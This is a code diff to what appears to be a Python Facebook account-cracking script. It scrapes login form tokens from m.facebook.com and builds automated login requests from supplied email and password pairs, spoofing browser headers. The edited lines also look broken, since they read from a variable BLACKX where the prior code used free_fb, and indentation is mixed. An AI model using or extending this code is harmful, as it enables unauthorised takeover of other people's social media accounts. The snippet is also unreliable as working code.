@@ -317,13 +317,35 @@ def _M1_(ids,pasx):
                         session = requests.Session()
                         KING=random.choice(ugen) 
                         free_fb = session.get('https://m.facebook.com').text
-                        info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,'pass':ps,"login":"Log In"}
-                        had={
+                        info={'m_ts':re.search('name="m_ts" value="(.*?)"', str(BLACKX)).group(1), 
+			'li':re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
+			'try_number': '0', 
+			'unrecognized_tries': '0', 
+			'email': ids, 
+			'prefill_contact_point': '', 
+			'prefill_source': '', 
+			'prefill_type': '', 
+			'first_prefill_source': '', 
+			'first_prefill_type': '', 
+			'had_cp_prefilled': 'false', 
+			'had_password_prefilled': 'false', 
+			'is_smart_lock': 'true', 
+			'bi_xrwh': '0', 
+			'pass': ps, 
+			'jazoest':re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
+			'lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
+			'dyn': '', 
+			'csr': '', 
+			'req': '5', 
+			'a': '', 
+			'__user': '0', 
+			'_fb_noscript': 'true'} 
+			had={
                         'Host': f'm.facebook.com',
                         'content-length': '1662',
                         'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
                         'sec-ch-ua-mobile': '?1',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Avast/120.0.0.0',
+                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                         'x-response-format': 'JSONStream',
                         'content-type': 'application/x-www-form-urlencoded',
                         'x-fb-lsd': 'AVrEIFcZUZg',
